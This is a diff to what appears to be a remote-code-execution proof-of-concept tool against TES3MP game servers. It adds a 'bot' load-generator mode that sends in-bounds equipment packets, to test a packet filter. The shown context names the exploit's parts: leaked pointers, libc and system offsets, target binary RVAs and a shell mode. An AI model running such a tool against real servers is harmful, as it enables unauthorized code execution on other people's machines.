@@ -450,6 +450,41 @@ static bool readChat(Cli &c, int ms, std::string &out)
 //
 // oneShot != 0 runs a single command and exits, so the deploy tooling can verify itself without
 // driving stdin.
+// --bot: an ordinary client that sits in a cell and generates the traffic a real player would.
+//
+// WHY THIS EXISTS. The single most important fix in the correctness pass is that harvest() and
+// harvestFull() now drop relayed equipment packets that are not ours. Before, ANY player changing
+// equipment in the cell had their inventory parsed as our leaked pointer. That fix could not be
+// tested, because testing it needs a second client producing exactly that traffic, and every other
+// client in this tool is either the attacker or the reader.
+//
+// It sends IN-BOUNDS equipment changes only (index 0..18). This is a load generator, not a second
+// exploit: it must be able to run against a server nobody minds it touching, and it must produce
+// the same relay shape a real player produces or it proves nothing about the filter.
+static int runBot(const char *name, const char *cell, int intervalMs, int equipIdx)
+{
+    Cli B{};
+    if (!connectTo(B, "")) { printf("[bot] could not connect\n"); return 1; }
+    handshake(B, name);
+    if (!stillConnected(B)) { printf("[bot] kicked during handshake (server password?)\n"); return 4; }
+    loadCell(B, cell);
+    printf("[bot] %s in %s, in-bounds equipment index %d every %d ms. ctrl-C to stop.\n",
+           name, cell, equipIdx, intervalMs);
+    for (unsigned long n = 1;; n++) {
+        { BitStream bs; hdr(B, bs, ID_PLAYER_EQUIPMENT);
+          bs.Write(false); uint32_t cnt = 1; bs.Write(cnt);
+          int idx = equipIdx; bs.Write(idx);
+          char rid[64]; snprintf(rid, sizeof rid, "bot_%s_%lu", name, n);
+          RakString r = rstr(rid); RakString::SerializeCompressed(r.C_String(), &bs);
+          int c1 = (int)n, c2 = 0; float ec = 0; bs.Write(c1); bs.Write(c2); bs.Write(ec);
+          snd(B, bs); }
+        for (Packet *p = B.peer->Receive(); p; B.peer->DeallocatePacket(p), p = B.peer->Receive());
+        if (!stillConnected(B)) { printf("[bot] disconnected after %lu sends\n", n); return 1; }
+        if (g_verbose && n % 10 == 0) fprintf(stderr, "[bot] %lu sends\n", n);
+        usleep(intervalMs * 1000);
+    }
+}
+
 static int runShell(const char *name, const char *acctPass, const char *oneShot)
 {
     Cli A{};
@@ -698,6 +733,10 @@ static void usage(const char *a0)
       "                              CoreScripts gates chat on IsLoggedIn(); it registers on first use\n"
       "                              and so leaves data/player/<name>.json on the target.\n"
       "  -A, --account-pass <pw>     account password for -s (default: rce-poc-pw-1)\n"
+      "  -O, --bot                   LOAD GENERATOR. Join a cell as an ordinary client and send\n"
+      "                              in-bounds equipment changes forever. Exploits nothing. Exists to\n"
+      "                              put a second player's relays in the cell so the GUID filter can be\n"
+      "                              tested. -I sets the interval ms, -X the in-bounds index.\n"
       "  -F, --profile <file>        load a target profile (layout + RVAs). tools/gen-profile derives\n"
       "                              the layout half from a TES3MP tree; -B derives the RVA half from\n"
       "                              the target binary and overrides what the profile supplied.\n"
@@ -741,11 +780,14 @@ int main(int argc, char **argv)
         {"libc", required_argument, 0, 'L'}, {"server-bin", required_argument, 0, 'B'},
         {"malloc-off", required_argument, 0, 'M'}, {"system-off", required_argument, 0, 'S'},
         {"profile", required_argument, 0, 'F'},
+        {"bot", no_argument, 0, 'O'}, {"bot-interval", required_argument, 0, 'I'},
+        {"bot-index", required_argument, 0, 'X'},
         {"verbose", no_argument, 0, 'v'}, {"help", no_argument, 0, 'h'}, {0, 0, 0, 0}};
     const char *libcPath = 0, *serverBin = 0, *profPath = 0;
+    int botMode = 0, botInterval = 700, botIndex = 3;
     int mGiven = 0, sGiven = 0;
     int c;
-    while ((c = getopt_long(argc, argv, "P:c:t:b:n:C:psA:L:B:M:S:F:vh", lo, 0)) != -1) {
+    while ((c = getopt_long(argc, argv, "P:c:t:b:n:C:psA:L:B:M:S:F:OI:X:vh", lo, 0)) != -1) {
         switch (c) {
             case 'P': g_srvpass = optarg; break;
             case 'c': cmd = optarg; break;
@@ -759,6 +801,9 @@ int main(int argc, char **argv)
             case 'L': libcPath = optarg; break;
             case 'B': serverBin = optarg; break;
             case 'F': profPath = optarg; break;
+            case 'O': botMode = 1; break;
+            case 'I': botInterval = atoi(optarg); break;
+            case 'X': botIndex = atoi(optarg); break;
             case 'M': P.malloc_off = strtoull(optarg, 0, 0); mGiven = 1; break;
             case 'S': P.system_off = strtoull(optarg, 0, 0); sGiven = 1; break;
             case 'v': g_verbose = 1; break;
@@ -767,6 +812,13 @@ int main(int argc, char **argv)
     }
     if (optind < argc) g_host = argv[optind++];
     if (optind < argc) g_port = atoi(argv[optind++]);
+
+    if (botMode) {
+        printf("[*] bot -> %s:%d, cell %s. Generates ordinary in-bounds equipment traffic; exploits nothing.\n",
+               g_host, g_port, cell);
+        fingerprint();
+        return runBot(nameBase, cell, botInterval, botIndex);
+    }
 
     if (shellMode) {
         int cmdGiven = 0;
